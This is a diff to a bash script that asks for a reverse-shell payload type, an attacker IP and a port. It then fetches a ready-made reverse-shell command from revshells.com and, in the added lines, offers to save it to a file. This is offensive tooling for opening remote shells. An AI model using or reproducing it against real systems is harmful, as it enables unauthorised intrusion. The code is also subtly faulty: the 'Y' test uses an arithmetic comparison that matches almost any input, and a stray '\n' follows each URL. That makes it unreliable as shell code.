@@ -185,4 +185,12 @@ read -p "PAYLOAD: " PAYLOAD
 read -p "IP: " IP
 read -p "PORT: " PORT
 
-curl "https://www.revshells.com/`echo $PAYLOAD | sed -e 's/ /%20/g'`?ip=$IP&port=$PORT&shell=sh&encoding=sh"\n
+read -p "Do you want to output to a file? (Y/N): " OUTPUT
+
+if [[ $OUTPUT -eq "Y" ]]
+then
+    read -p "What do you want the name of the file to be? " FILENAME
+    curl "https://www.revshells.com/`echo $PAYLOAD | sed -e 's/ /%20/g'`?ip=$IP&port=$PORT&shell=sh&encoding=sh"\n > $FILENAME
+else
+    curl "https://www.revshells.com/`echo $PAYLOAD | sed -e 's/ /%20/g'`?ip=$IP&port=$PORT&shell=sh&encoding=sh"\n
+fi
